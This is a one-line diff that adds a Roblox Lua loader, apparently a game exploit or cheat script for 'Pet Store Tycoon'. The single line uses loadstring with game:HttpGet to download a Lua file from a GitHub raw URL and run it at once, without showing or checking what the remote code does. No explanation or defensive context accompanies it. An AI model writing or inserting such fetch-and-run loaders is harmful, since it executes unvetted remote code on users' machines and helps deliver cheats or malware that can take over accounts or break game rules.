@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/pet-store-tycoon-spam4-pcuw1m21m59wt0.lua"))()
